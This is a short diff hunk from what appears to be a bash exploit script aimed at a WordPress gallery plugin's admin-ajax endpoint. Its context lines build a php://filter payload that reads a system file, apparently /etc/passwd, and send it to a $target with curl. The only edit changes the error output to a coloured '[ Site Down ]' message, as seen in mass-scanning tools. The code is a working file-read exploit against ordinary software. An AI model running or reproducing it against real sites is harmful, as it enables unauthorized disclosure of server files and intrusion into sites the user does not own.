@@ -34,7 +34,7 @@ payload=$(echo -n '{"pagepath": "php://filter/convert.base64-encode/resource=/et
 response=$(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=$payload")
 
 if [[ $? -ne 0 ]]; then
-    echo "Error occurred while making the request to $target"
+    printf "${red}[ Site Down ]${classic} => $target \n";
     return
 fi
 
